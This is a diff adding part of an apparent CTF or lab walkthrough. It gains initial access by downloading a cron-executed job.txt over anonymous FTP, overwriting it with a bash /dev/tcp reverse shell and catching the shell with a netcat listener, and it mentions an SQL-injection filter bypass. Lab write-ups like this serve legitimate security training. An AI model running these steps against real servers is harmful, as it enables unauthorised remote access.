@@ -1,3 +1,29 @@
+## Initial Access Point 1
+1. Log into FTP server (username: anonymous, no password)
+```
+ftp <ip>
+```
+2. Download files from /upload folder
+```
+cd upload
+get job.txt
+get job_log.txt
+```
+3. Observe that a cronjob executes the text in job.txt.
+4. Modify job.txt with reverse shell command
+```
+bash -i >& /dev/tcp/<ip>/<port> 0>&1
+```
+5. Upload modified job.txt file. You will not be able to upload your file without deleting the present one in the FTP server
+```
+delete job.txt
+put job.txt
+```
+6. Start netcat on separate terminal
+```
+nc -lvnp <port>
+```
+
 ## Initial Access Point 2
 
 SQL Injection (since the or gets sanitized, we can do this "oorr"): 
